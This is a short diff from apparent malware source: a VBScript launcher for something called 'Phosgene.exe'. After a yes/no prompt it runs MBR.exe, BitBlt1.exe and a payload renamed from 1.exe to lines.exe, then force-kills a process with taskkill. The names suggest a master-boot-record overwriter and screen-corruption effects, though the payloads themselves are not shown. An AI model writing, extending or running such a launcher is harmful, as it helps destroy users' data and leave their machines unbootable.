@@ -59,7 +59,7 @@ intAnswer = _
         vbYesNo, "Phosgene.exe")
 If intAnswer = vbYes Then
     CreateObject("Wscript.Shell").run("MBR.exe")
-    CreateObject("Wscript.Shell").run("1.exe")
+    CreateObject("Wscript.Shell").run("lines.exe")
     CreateObject("Wscript.Shell").run("BitBlt1.exe")
     WScript.Sleep(30000)
     CreateObject("Wscript.Shell").run("taskkill /f /im 1.exe")
